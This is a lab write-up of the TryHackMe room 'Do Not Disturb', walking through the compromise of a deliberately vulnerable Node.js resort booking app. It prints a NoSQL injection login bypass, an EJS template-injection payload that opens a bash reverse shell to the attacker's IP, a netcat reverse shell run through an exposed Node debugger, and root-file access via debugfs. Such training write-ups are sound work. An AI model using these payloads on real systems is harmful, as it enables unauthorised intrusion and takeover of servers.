# Do Not Disturb - TryHackMe Write-up

- **Platform:** [TryHackMe](https://tryhackme.com/)
- **Room:** Do Not Disturb
- **Difficulty:** Medium
- **Category:** Web Exploitation & Boot2Root
- **Tools Used:** Kali Linux, BurpSuite, Nmap, feroxbuster, netcat, wordlist

## Challenge Overview
The scenario places us in a test against Byte Lotus, a resort booking system running on an insecure Linux server. The web app has bad input filters and leaves internal tools open.

The main objective is to bypass the login page from the outside, get access to a standard user account to read the user flag, and then use system misconfigurations to read the final root flag.

<img width="602" height="495" alt="image" src="https://github.com/user-attachments/assets/c1ab8c9c-a60a-4362-bbe4-07e51df78f3b" />

## Recon
<details>
<summary>Click here</summary>

In this step, we scan the target machine to find open ports and discover what services are running. We use Nmap to gather information about the system and check the exact software versions.

Here is what our command options do:

- Pn: Skips the initial ping check and treats the host as online.

- sC: Runs default Nmap security scripts to detect common vulnerabilities and gather extra details.

- sV: Probes open ports to determine the exact service and version numbers running on them.

- T4: Sets the scan timing to aggressive speed so the scan completes faster without being too unstable.

```bash
nmap -Pn -sC -sV -T4
```

<img width="687" height="120" alt="image" src="https://github.com/user-attachments/assets/ffbb03fd-3b22-46f1-ace1-fe79d1f04e24" />


From this scan, we discover the open services on the target:

- Port 22 (SSH): An OpenSSH service used for remote terminal administration.

- Port 80 (HTTP): A web server hosting the Node.js web application named "Byte Lotus Poolside".

Next, we look for hidden files and directories on the web server using Feroxbuster with a standard wordlist:

```bash
feroxbuster -w /usr/share/wordlists/dirb/common.txt -u http://donotdisturb.thm/
```
<img width="1088" height="432" alt="image" src="https://github.com/user-attachments/assets/5976403d-9ea0-417e-8d61-d99d2d9b32ad" />

- Hidden Endpoint Found: The tool discovers the /staff path on the web server.

- Authentication Barrier: Visiting /staff redirects back to the index login page, which hints at a valid username: attendant.

---

I try to edit the url page ( just incase it possible) but the system block it.

<img width="825" height="507" alt="image" src="https://github.com/user-attachments/assets/e8eb1ddf-150d-486f-b902-1b8c2d4b7f23" />

</details>

## Initial Access & Exploitation (Gaining the First Shell)
<details>
<summary>Click here</summary>

Now that we know the website runs on Node.js and has a login page, we need to find a way to log in without knowing the password. Node.js apps often use MongoDB (a NoSQL database), so we can try a NoSQL Injection attack. 

We use Burp Suite to capture our login request and change the password parameter to use a special query trick.

<img width="1082" height="225" alt="image" src="https://github.com/user-attachments/assets/53f4c3c5-8942-4213-89c7-054c24f4f6f7" />

- NoSQL Injection Payload: We send ``` username=attendant&password[$ne]=asdf.```

- Why it works: The [$ne] operator means "Not Equal". It tells the database: "Find the user 'attendant' whose password is not equal to 'asdf'." Since the real password is not "asdf", the check passes and logs us in.

- Access Granted: The server redirects us to the hidden /staff page.

<img width="607" height="497" alt="image" src="https://github.com/user-attachments/assets/f8b0b1a2-d0ba-46e9-b9c4-5eadca2ed393" />

On the /staff page, there is a text box to customize guest booking messages. 

- The symbol <%= ... %> is special code for a Node.js template engine named EJS.
- When you click "Preview", the server does not just print your text—it executes whatever code is inside <%= ... %> as real programming instructions.
- This security flaw is called SSTI (Server-Side Template Injection), and it means you can force the target server to run system commands for you.
- We can exploit this to force the target server to connect back to our computer using a Reverse Shell.

Before sending our exploit, we open a terminal in Kali Linux and run nc -lvnp 4445. This keeps port 4445 open and ready to catch the connection from the server.
```bash
nc -lvnp 4445
```

In the message box, we replace the text with the following JavaScript payload
```bash
<%= (function(){ this.constructor.constructor("return process")().mainModule.require("child_process").spawn("bash", ["-c", "bash -i >& /dev/tcp/192.168.139.129/4445 0>&1"], {detached: true}); return "sent"; })() %>
```

Click Preview, the server executes our code and connects back to our open Netcat listener. We gain an interactive shell as the user poolside and retrieve the user flag

<img width="647" height="232" alt="image" src="https://github.com/user-attachments/assets/32f09d96-4edc-480d-aff8-eca4d5af27c9" />

</details>

---

## Gaining Root Access

<details>
<summary>Click here</summary>

After retrieve the user flag, we need to find internal misconfigurations to gain administrative access. We run LinPEAS to scan the system for hidden vulnerabilities:

<img width="1312" height="595" alt="image" src="https://github.com/user-attachments/assets/420c5ee1-ddd4-45e2-b783-06c5402b35fd" />

When we check the scan results, we find an interesting program running quietly in the background:
```bash
pipelin+  604  /usr/bin/node --inspect=127.0.0.1:9229 processor.js
```

- The --inspect setting is a developer tool used for debugging. Because it is left open on port 9229, anyone already inside the machine can connect to it and run commands under the owner account without needing a password.

- On Kali, we open a new terminal window and wait for a second connection on port 4446:

```bash
nc -lvnp 4446
```

Inside our poolside shell, we hook directly into the open debug port:

```bash
node inspect 127.0.0.1:9229
```

In the debug> prompt, we run this JavaScript command to make the server call our Kali listener:

```bash
exec (process.mainModule.require('child_process').execSync('busybox nc 192.168.139.129 4446 -e bash').toString())
```

Our Kali terminal catches the connection. We are now logged in as the new user: pipelinesvc.

we check our new user account permissions by typing: ```id```

<img width="590" height="35" alt="image" src="https://github.com/user-attachments/assets/faf7e2d7-1b5a-429b-8ba5-5a8b2a0e043e" />

The result shows that pipelinesvc is a member of the disk group (groups=...(disk)).

- The disk group gives direct read access to the entire physical hard drive. This lets us bypass normal Linux file permissions completely, even files owned by root.

We run lsblk to list the system storage drives and spot the main system partition

<img width="551" height="232" alt="image" src="https://github.com/user-attachments/assets/b3337626-0681-4dba-90a7-f50465eddf68" />

Open the root partition with debugfs in write mode.

```bash
debugfs -w /dev/nvme0n1p1
```

<img width="637" height="387" alt="image" src="https://github.com/user-attachments/assets/d913543f-eab6-4ff8-9f6b-8a6bc806b9bf" />

Inside the debugfs: prompt, we open the protected root flag file or just simply
```bash
cat /root/root.txt
```

</details>







